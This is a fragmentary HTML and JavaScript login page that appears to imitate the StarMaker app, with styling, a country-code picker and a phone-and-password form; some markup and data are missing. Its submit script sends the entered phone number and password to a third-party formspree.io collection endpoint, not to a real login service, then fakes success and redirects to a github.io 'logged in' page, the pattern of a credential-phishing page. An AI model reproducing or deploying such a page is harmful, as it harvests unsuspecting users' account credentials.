    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: #000;
            color: #fff;
            overflow: hidden;
            height: 100vh;
        }

        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -2;
        }

        .video-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: -1;
        }

        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            width: 3px;
            height: 3px;
            background: rgba(255, 255, 255, 0.4);
            border-radius: 50%;
            animation: float 15s infinite ease-in-out;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) translateX(50px); opacity: 0; }
        }

        .logo-container {
            position: absolute;
            top: 30px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            opacity: 0;
            animation: fadeInDown 1s ease forwards 0.5s;
        }

        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }

        .logo-container img {
            height: 60px;
            transition: transform 0.3s ease;
        }

        .logo-container img:hover {
            transform: scale(1.05);
        }

        .login-wrapper {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
            width: 90%;
            max-width: 450px;
            opacity: 0;
            animation: fadeInUp 1s ease forwards 0.8s;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translate(-50%, -40%);
            }
            to {
                opacity: 1;
                transform: translate(-50%, -50%);
            }
        }

        .login-container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 25px;
            padding: 40px 35px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .login-title {
            text-align: center;
            color: #444444;
            font-size: 26px;
            margin-bottom: 30px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group input {
            width: 100%;
            padding: 15px 20px;
            border: none;
            border-radius: 25px;
            background: #f1f1f1;
            font-size: 15px;
            color: #333;
            transition: all 0.3s ease;
            font-family: 'Roboto', sans-serif;
        }

        .form-group input:focus {
            outline: none;
            background: #e8e8e8;
            box-shadow: 0 0 0 2px rgba(255, 41, 111, 0.2);
        }

        .form-group input::placeholder {
            color: #999;
        }

        .phone-input-group {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .country-selector {
            flex-shrink: 0;
            background: #f1f1f1;
            border: none;
            border-radius: 25px;
            padding: 15px 20px;
            font-size: 15px;
            font-weight: 600;
            color: #333;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Roboto', sans-serif;
            display: flex;
            align-items: center;
            gap: 8px;
            min-width: 120px;
        }

        .country-selector:hover {
            background: #e8e8e8;
        }

        .country-selector:focus {
            outline: none;
            box-shadow: 0 0 0 2px rgba(255, 41, 111, 0.2);
        }

        .country-selector i {
            font-size: 12px;
            color: #666;
        }

        .phone-input-group input {
            flex: 1;
        }

        .country-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 3000;
            display: none;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(5px);
        }

        .country-modal.active {
            display: flex;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .country-modal-content {
            background: #fff;
            border-radius: 20px;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            display: flex;
            flex-direction: column;
            animation: slideUp 0.3s ease;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .country-modal-header {
            padding: 25px 25px 20px;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .country-modal-back {
            cursor: pointer;
            width: 35px;
            height: 35px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background: #f5f5f5;
            transition: all 0.3s ease;
            flex-shrink: 0;
        }

        .country-modal-back:hover {
            background: #e8e8e8;
        }

        .country-modal-back i {
            font-size: 18px;
            color: #333;
        }

        .country-modal-title {
            font-size: 22px;
            font-weight: 700;
            color: #333;
            margin: 0;
        }

        .country-search {
            padding: 15px 25px;
            border-bottom: 1px solid #e0e0e0;
        }

        .country-search input {
            width: 100%;
            padding: 12px 18px;
            border: 1px solid #ddd;
            border-radius: 15px;
            font-size: 15px;
            color: #333;
            transition: all 0.3s ease;
            font-family: 'Roboto', sans-serif;
        }

        .country-search input:focus {
            outline: none;
            border-color: #ff296f;
            box-shadow: 0 0 0 3px rgba(255, 41, 111, 0.1);
        }

        .country-list {
            flex: 1;
            overflow-y: auto;
            padding: 10px 0;
        }

        .country-list::-webkit-scrollbar {
            width: 6px;
        }

        .country-list::-webkit-scrollbar-track {
            background: #f5f5f5;
        }

        .country-list::-webkit-scrollbar-thumb {
            background: #ccc;
            border-radius: 3px;
        }

        .country-list::-webkit-scrollbar-thumb:hover {
            background: #aaa;
        }

        .country-item {
            padding: 15px 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            transition: all 0.2s ease;
            border-left: 3px solid transparent;
        }

        .country-item:hover {
            background: #f8f8f8;
            border-left-color: #ff296f;
        }

        .country-item.selected {
            background: rgba(255, 41, 111, 0.05);
            border-left-color: #ff296f;
        }

        .country-name {
            font-size: 16px;
            color: #333;
            font-weight: 400;
        }

        .country-code {
            font-size: 15px;
            color: #666;
            font-weight: 500;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #ff296f, #ff6b9d);
            color: #fff;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            cursor: pointer;
            transition: all 0.4s ease;
            margin-top: 10px;
            font-family: 'Roboto', sans-serif;
            position: relative;
            overflow: hidden;
        }

        .login-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.5s ease;
        }

        .login-btn:hover::before {
            left: 100%;
        }

        .login-btn:hover {
            background: #fff;
            color: #ff296f;
            box-shadow: 0 0 0 2px #ff296f inset;
            transform: translateY(-2px);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .success-message {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(135deg, #4caf50, #66bb6a);
            color: #fff;
            padding: 15px 30px;
            border-radius: 25px;
            font-weight: 600;
            font-size: 15px;
            z-index: 2000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.4s ease;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .success-message.show {
            opacity: 1;
            visibility: visible;
            animation: slideDown 0.4s ease;
        }

        @keyframes slideDown {
            from {
                transform: translateX(-50%) translateY(-20px);
            }
            to {
                transform: translateX(-50%) translateY(0);
            }
        }

        .error {
            border: 2px solid #ff296f !important;
            animation: shake 0.3s ease;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }

        @media (max-width: 768px) {
            .logo-container {

            }

            .logo-container img {

            }

            .login-container {

            }

            .login-title {

                margin-bottom: 25px;
            }

            .form-group input {
                padding: 14px 18px;
                font-size: 14px;
            }

            .login-btn {
                padding: 14px;
                font-size: 15px;
            }
        }

        @media (max-width: 480px) {
            .login-wrapper {

            }

            .login-container {

            }

            .logo-container img {
                height: 45px;
            }

            .country-selector {
                min-width: 100px;
                padding: 14px 16px;
                font-size: 14px;
            }

            .country-modal-content {
                width: 95%;
                max-height: 85vh;
            }

            .country-modal-header {
                padding: 20px 20px 15px;
            }

            .country-modal-title {
                font-size: 20px;
            }

            .country-item {
                padding: 13px 20px;
            }

            .phone-input-group {
                gap: 8px;
            }
        }

</head>

            particle.className = 'particle';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.animationDelay = Math.random() * 15 + 's';
            particle.style.animationDuration = (Math.random() * 10 + 10) + 's';

        const form = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const successMessage = document.getElementById('successMessage');
        const mobile = document.getElementById('mobile');
        const password = document.getElementById('password');
        const countrySelector = document.getElementById('countrySelector');
        const countryModal = document.getElementById('countryModal');
        const closeModal = document.getElementById('closeModal');
        const countryList = document.getElementById('countryList');
        const countrySearch = document.getElementById('countrySearch');
        const selectedCountrySpan = document.getElementById('selectedCountry');

        function renderCountries(filter = '') {
            const filteredCountries = countries.filter(country => 
                country.name.toLowerCase().includes(filter.toLowerCase()) ||
                country.code.includes(filter)
            );

            countryList.innerHTML = filteredCountries.map(country => `
                <div class="country-item ${country.iso === selectedCountryData.iso ? 'selected' : ''}" 
                     data-iso="${country.iso}" 
                     data-code="${country.code}" 
                     data-name="${country.name}">
                    <span class="country-name">${country.name}</span>
                    <span class="country-code">${country.code}</span>
                </div>
            `).join('');

            document.querySelectorAll('.country-item').forEach(item => {
                item.addEventListener('click', () => {
                    selectedCountryData = {
                        iso: item.dataset.iso,
                        code: item.dataset.code,
                        name: item.dataset.name
                    };
                    selectedCountrySpan.textContent = `${selectedCountryData.iso} ${selectedCountryData.code}`;
                    countryModal.classList.remove('active');
                    countrySearch.value = '';
                });
            });
        }

        countrySelector.addEventListener('click', () => {
            countryModal.classList.add('active');
            renderCountries();
            countrySearch.focus();
        });

        closeModal.addEventListener('click', () => {
            countryModal.classList.remove('active');
            countrySearch.value = '';
        });

        countryModal.addEventListener('click', (e) => {
            if (e.target === countryModal) {
                countryModal.classList.remove('active');
                countrySearch.value = '';
            }
        });

        countrySearch.addEventListener('input', (e) => {
            renderCountries(e.target.value);
        });

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            [mobile, password].forEach(input => {
                input.classList.remove('error');
            });

            let isValid = true;
            if (!mobile.value.trim() || !/^[0-9]{10}$/.test(mobile.value)) {
                mobile.classList.add('error');
                isValid = false;
            }
            if (!password.value.trim()) {
                password.classList.add('error');
                isValid = false;
            }

            if (!isValid) return;

            loginBtn.disabled = true;
            loginBtn.textContent = 'Logging in...';

            const formData = new FormData();
            formData.append('country', `${selectedCountryData.iso} ${selectedCountryData.code}`);
            formData.append('number', mobile.value);
            formData.append('password', password.value);

            try {
                const response = await fetch('https://formspree.io/f/mjvqvkjr', {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                });

                if (response.ok) {
                    successMessage.classList.add('show');
                    
                    setTimeout(() => {
                        successMessage.classList.remove('show');
                        form.reset();
                        loginBtn.disabled = false;
                        loginBtn.textContent = 'Log In';
                        selectedCountryData = { name: 'India', code: '+91', iso: 'IN' };
                        selectedCountrySpan.textContent = 'IN +91';
                        window.location.href = 'https://starmakerstudio.github.io/web/Starmaker%20Web/Starmaker%20Logged/loggedin.html';
                    }, 2000);
                } else {
                    throw new Error('Form submission failed');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Login failed. Please try again.');
                loginBtn.disabled = false;
                loginBtn.textContent = 'Log In';
            }
        });

        [mobile, password].forEach(input => {
            input.addEventListener('input', () => {
                input.classList.remove('error');
            });
        });

        renderCountries();
    </script>
